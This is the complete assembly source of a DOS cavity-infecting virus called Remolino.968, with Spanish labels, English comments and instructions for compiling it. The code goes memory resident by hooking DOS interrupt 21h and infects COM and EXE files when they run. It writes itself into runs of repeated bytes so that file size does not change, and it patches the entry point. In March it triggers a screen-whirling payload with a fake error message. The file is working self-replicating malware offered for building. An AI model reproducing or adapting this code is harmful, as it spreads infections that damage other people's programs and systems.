; Remolino.968
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>
;                                                          Trumpet WinCock
;
; þ Infects COM and EXE files without increasing their size
; þ Memory resident
; þ Infection on execution (4b00h)
; þ 968 bytes long
;
; This is the first  sample of a new kind of infectors; neither appending,
; nor prepending, nor ap-pre-pending, nor even overwriting... it's a guest
; infector. It goes memory resident and, when files are executed, it looks
; for enough room in their code to place a copy of itself, so the infected
; file length  doesn't grow, the host  will work, and we won't have to use
; any kind of stealth technique.
;
; Of course, these bytes i  mean are empty or unused bytes; anyway, have a
; look further at the code and see how  does my  virus look for free space
; in their victims.
;
; Besides this, the virus took its name from its  payload (remolino is the
; spanish word for whirlwind, or in this case, 'whirlscreen'), which beca-
; me rather famous, being  even used -an adaption- by NuKE in their zines.
; It activates  when the virus is  executed in march and the seconds field
; in the system time is equal to eight.
;
; Compiling instructions:
;
; tasm /m remolino.asm
; tlink remolino.obj
; exe2bin remolino.exe remolino.com


codigo      segment word public 'code'
            assume  cs:codigo,ds:codigo,es:codigo,ss:codigo
            org     0h

octetos     equ     offset(des21)-offset(criatura)
palabras    equ     (octetos+1)/2
parrafos    equ     (offset(ultimo)-offset(criatura)+15)/16

criatura    proc    near                        ; Virus start
            push    ax                          ; Push registers
            push    ds
            call    proxima01

proxima01:  pop     bp
            sub     bp,offset(proxima01)        ; Get delta offset

            mov     ax,8888h                    ; Install check
            int     21h

            cmp     ax,0ca05h
            jne     reside02

            mov     cx,14                       ; Move the data to the
            cld                                 ; resident copy
            push    cs
            pop     ds
            lea     si,salto
            mov     di,si
            add     si,bp
            rep     movsb

            push    es                          ; Jump to the copy
            push    cs
            pop     es
            lea     dx,restaura05
            push    dx
            retf

reside02:   mov     bl,02h                 ; Get last fit strategy
            mov     ax,5801h
            int     21h

            mov     bx,parrafos            ; Ask for a memory block
            mov     ah,48h
            int     21h
            jnc     marca03

            mov     ax,ds                  ; Point to the MCB header
            dec     ax
            mov     ds,ax

            mov     bx,ds:[0003h]          ; Restore the original file
            sub     bx,parrafos+1          ; size to the program
            mov     ah,4ah
            int     21h

            mov     bx,parrafos            ; Ask for a block with the
            mov     ah,48h                 ; original size
            int     21h
            sub     word ptr es:[0002h],parrafos+1

marca03:    mov     es,ax                  ; Mark the block as used
            dec     ax                     ; by DOS
            push    ax
            pop     ds
            mov     word ptr ds:[0001h],0008h

            xor     bl,bl                  ; Restore the last fit strategy
            mov     ax,5801h
            int     21h

            mov     cx,palabras            ; Copy the viral code into
            cld                            ; the new block
            push    cs
            pop     ds
            mov     si,bp
            xor     di,di
            rep     movsw

            push    es                     ; Jump to the new copy
            push    cs
            pop     es
            lea     dx,cambia04
            push    dx
            retf

cambia04:   push    cs
            pop     ds
            push    es
            mov     ax,3521h               ; Read and write the original
            int     21h                    ; int 21h vector
            mov     des21,bx
            mov     seg21,es
            pop     es

            lea     dx,rutina21            ; Make it point to ours
            mov     ax,2521h
            int     21h

restaura05: pop     bx                     ; Empty the stack
            pop     dx

            push    cs                     ; Restore the block owned
            pop     ds                     ; by the previous code
            mov     cx,palabras
            cld
            mov     ax,dato
            mov     di,bp
            rep     stosw

            cmp     salto,0                ; Jump if it's an EXE
            je      apila06

            mov     cx,principio[0]        ; Restore the first three
            mov     es:[0100h],cx          ; bytes of the host file
            mov     cx,principio[2]
            mov     es:[0102h],cx

apila06:    mov     cx,es                  ; Save the original entry
            add     cx,retorno[2]          ; point address
            push    cx
            push    retorno[0]

            mov     ds,bx                  ; Restore registers
            mov     es,bx
            mov     ax,dx

            retf                           ; Jump to the restored host
criatura    endp

desplazador proc    near
caracter07: mov     di,si                  ; Move a character one
            add     si,ax                  ; position each time this
            mov     bp,[si]                ; routine is called
            mov     [di],bp
            loop    caracter07
            ret
desplazador endp

remolino    proc    near                   ; Whirlscreen payload
            mov     ah,2ah                 ; Get the system date
            int     21h
            cmp     dh,3                   ; March?
            jne     fin08
                                           ; Get the system time
            mov     ah,2ch
            int     21h
            cmp     dh,8                   ; Seconds=8?
            jne     fin08

            mov     ah,0fh                 ; Get video mode
            int     10h

            cmp     al,02h                 ; Jump if it's 80x25 text
            je      color09
            cmp     al,03h
            je      color09
            cmp     al,07h
            je      mono10
fin08:      ret

color09:    mov     dx,0b800h              ; Calculate the start of the
            jmp     pagina11               ; video memory
mono10:     mov     dx,0b000h

pagina11:   add     dh,bh                  ; Add the page number
            mov     cx,56                  ; Display the message in the
            cld                            ; middle of the screen
            push    cs
            pop     ds
            lea     si,mensaje
            mov     ah,0cfh
            mov     es,dx
            mov     di,1944

mueve12:    lodsb
            neg     al
            stosw
            loop    mueve12

            in      al,61h                 ; Internal speaker on
            or      al,03h
            out     61h,al

            push    es                     ; Makes every character rotate
            pop     ds                     ; and disappear
            mov     bx,1944

caracter13: mov     al,0b6h                ; Get the timer ready
            out     43h,al

            test    bl,01h                 ; Low frecuency for even
            jnz     impar14                ; characters and high for the
            mov     ax,2e9ch               ; odd ones
            jmp     envia15

impar14:    mov     ax,04a9h

envia15:    out     42h,al
            mov     al,ah
            out     42h,al

            mov     si,1942                ; Rotate every square in
            mov     dl,1                   ; a whirl-alike way

vuelta16:   mov     cl,dl                  ; Move down the left side
            mov     ax,-160
            call    desplazador

            mov     cl,dl                  ; Move to the left the upper
            add     cl,56                  ; side
            mov     ax,2
            call    desplazador

            inc     dl                     ; Move up the right side
            mov     cl,dl
            mov     ax,160
            call    desplazador

            mov     cl,dl                  ; Move to the right the
            add     cl,56                  ; lower side
            mov     ax,-2
            call    desplazador

            inc     dl                     ; Repeat for every square
            cmp     dl,25
            jne     vuelta16

            dec     bx                     ; Repeat for every character
            jnz     caracter13
                                           ; Disable the internal speaker
            in      al,61h
            and     al,0fch
            out     61h,al
            ret
remolino    endp                           ; Payload end

buscador    proc    near
            mov     cx,24                  ; Read the first bytes
            push    es                     ; of the file
            pop     ds
            xor     dx,dx
            mov     ah,3fh
            int     21h
            jc      nohalla19

            cmp     word ptr ds:[0],'ZM'     ; Jump if it's an EXE
            je      ejecuta18

            cmp     byte ptr ds:[0003h],88h  ; Jump if the file was
            je      nohalla19                ; previously infected

            mov     ax,ds:[0]                ; Store the two first words
            mov     cx,ds:[2]                ; of the file
            push    cs
            pop     ds
            mov     salto,0e9h
            mov     principio[0],ax
            mov     principio[2],cx

            mov     ax,4                     ; Find out the first word
            xor     dx,dx                    ; after the start
            jmp     inicia21

ejecuta18:  cmp     byte ptr ds:[0013h],88h  ; Jump if it ain't infected
            jne     calcula20

nohalla19:  stc                              ; Get out without any room
            ret

calcula20:  mov     ax,ds:[0004h]            ; Calcul8 the size in bytes
            dec     ax
            mov     cx,512
            mul     cx
            add     ax,ds:[0002h]

            mov     si,ds:[0008h]            ; Load the header size and
            mov     cx,ds:[0014h]            ; the entry point
            mov     di,ds:[0016h]
            push    cs
            pop     ds

            mov     salto,0                  ; Store the data
            mov     tamano[0],ax
            mov     tamano[2],dx
            mov     distancia,si
            mov     retorno[0],cx
            mov     retorno[2],di

            mov     ax,si                    ; Find out the first word
            mov     cx,16                    ; of the file
            mul     cx

inicia21:   mov     cx,dx                    ; Move the pointer to that
            mov     dx,ax                    ; word
            mov     ax,4200h
            int     21h

            xor     bp,bp                    ; Our room position (start)
            mov     di,ax

lee22:      mov     cx,1024*16               ; Read 16k
            push    es
            pop     ds
            push    dx
            xor     dx,dx
            mov     ah,3fh
            int     21h
            pop     dx
            jc      nohalla27

            shr     cx,1                     ; Go thru every word we read
            cld
            xor     si,si

busca23:    push    es                       ; Load one word and inc
            pop     ds                       ; the global pointer
            lodsw
            add     di,2
            adc     dx,0

            push    cs                       ; If it's equal to the
            pop     ds                       ; previous one, jump
            cmp     ax,dato
            je      incremen24

            mov     dato,ax                  ; Update the found datum
            xor     bp,bp                    ; and set the room to zero

incremen24: inc     bp                       ; Inc the room in one word
            cmp     bp,palabras+2            ; Jump if necessary
            je      halla26

            cmp     dx,tamano[2]             ; If we go over the size,
            jb      repite25                 ; we better skip the file
            ja      nohalla27
            cmp     di,tamano[0]
            jae     nohalla27

repite25:   loop    busca23
            jmp     lee22

halla26:    sub     di,palabras*2            ; Find out the first offset
            sbb     dx,0                     ; of our room
            clc
            ret

nohalla27:  stc                              ; Go back without any room
            ret
buscador    endp

grabador    proc    near
            mov     ax,di                    ; Copy the pointer
            mov     si,dx

            cmp     salto,0                  ; Jump in case it's an EXE
            je      ejecuta28                ; file

            sub     ax,3                     ; Find out the distance from
            mov     distancia,ax             ; the start to the code

            mov     retorno[0],0100h         ; Save the entry point
            mov     retorno[2],0
            jmp     mueve29

ejecuta28:  mov     cx,16                    ; Save the new entry offset
            div     cx
            mov     principio[0],dx

            sub     ax,distancia             ; Restore the header length
            mov     principio[2],ax          ; in the segment

            sub     retorno[2],ax

mueve29:    mov     cx,si                    ; Move the pointer to the
            mov     dx,di                    ; just found room
            mov     ax,4200h
            int     21h

            mov     cx,octetos               ; Write the virus block
            xor     dx,dx
            mov     ah,40h
            int     21h
            jc      vuelve34

            cmp     salto,0                  ; Jump if it's an EXE file
            je      ejecuta30
                                             ; Move the pointer to the
            xor     dx,dx                    ; start of the file
            jmp     mueve31

ejecuta30:  mov     dx,0013h

mueve31:    xor     cx,cx                    ; Move the pointer to the
            mov     ax,4200h                 ; file header
            int     21h

            cmp     salto,0                  ; Jump if it's an EXE file
            je      ejecuta32

            mov     cx,4                     ; Write a jmp to the viral
            lea     dx,salto                 ; code so we're executed
            jmp     escribe33

ejecuta32:  mov     cx,5                     ; Write the new entry point
            lea     dx,marca
escribe33:  mov     ah,40h
            int     21h
vuelve34:   ret
grabador    endp

rutina24:   mov     al,03h                   ; Return the error code
            iret

rutina21:   cmp     ax,8888h                 ; Yep, we're memory resident
            jne     termina35
            mov     ax,0ca05h
            push    cs
            pop     es
            iret

termina35:  cmp     ax,4b00h                 ; File execution?
            je      ejecuta36
            jmp     fin41

ejecuta36:  push    ax                       ; Store registers
            push    bx
            push    cx
            push    dx
            push    si
            push    di
            push    ds
            push    es
            push    bp

            call    remolino                 ; Can we execute the payload?

            push    cs
            pop     ds
            mov     ax,3524h                 ; Read and store the int 24h
            int     21h                      ; original vector
            mov     des24,bx
            mov     seg24,es

            lea     dx,rutina24              ; Point to our routine
            mov     ax,2524h
            int     21h

            lea     dx,hueco                 ; New DTA
            mov     ah,1ah
            int     21h

            mov     bp,sp                    ; Look for info about the
            mov     dx,[bp+4]                ; file
            mov     ds,dx
            mov     dx,[bp+10]
            mov     cl,27h
            mov     ah,4eh
            int     21h
            jc      vuelve40

            mov     bx,1024                  ; Ask for a 16k mem block
            mov     ah,48h
            int     21h
            jc      vuelve40
            mov     es,ax

            xor     cx,cx
            mov     ax,4301h                 ; Whipe attributes
            int     21h
            jc      libera39

            mov     ax,3d02h                 ; Open file in read/write
            int     21h                      ; mode
            jc      repone38
            mov     bx,ax

            call    buscador                 ; Jump if there's not a
            jc      cierra37                 ; room big enough for us

            call    grabador                 ; Can we copy ourselves?

cierra37:   push    cs
            pop     ds
            mov     cx,hora                  ; Restore date and time
            mov     dx,fecha
            mov     ax,5701h
            int     21h

            mov     ah,3eh                   ; Close file
            int     21h

repone38:   mov     cl,atributo
            mov     bp,sp
            mov     dx,[bp+4]                ; Restore the original file
            mov     ds,dx                    ; attributes
            mov     dx,[bp+10]
            mov     ax,4301h
            int     21h

libera39:   mov     ah,49h                   ; Free the memory block
            int     21h

vuelve40:   lds     dx,dword ptr ds:[des24]  ; Restore int 24h vector
            mov     ax,2524h
            int     21h

            pop     bp                       ; Pop registers
            pop     es
            pop     ds
            pop     di
            pop     si
            pop     dx
            pop     cx
            pop     bx
            pop     ax
                                             ; Bring control back to the
fin41:      jmp     dword ptr cs:[des21]     ; original int 21h handler

mensaje     db -' ',-'<',-'-',-'-',-'-',-'-',-'-',-'-',-'-',-' ',-'E',-'R'
            db -'R',-'O',-'R',-' ',-'C',-'R',-'I',-'T',-'I',-'C',-'O',-':'
            db -' ',-'F',-'u',-'g',-'a',-' ',-'d',-'e',-' ',-'p',-'r',-'e'
            db -'s',-'i',-'¢',-'n',-' ',-'e',-'n',-' ',-'e',-'l',-' ',-'m'
            db -'o',-'n',-'i',-'t',-'o',-'r',-'.',-' '

salto       db      0e9h
distancia   dw      0
marca       db      88h
principio   dw      0c033h,21cdh
retorno     dw      0100h,0
dato        dw      89abh
des21       dw      0
seg21       dw      0
des24       dw      0
seg24       dw      0
hueco       db      21 dup (0)
atributo    db      0
hora        dw      0
fecha       dw      0
tamano      dw      0,0
nombre      db      13 dup (0)
ultimo      db      ?

codigo      ends
            end     criatura
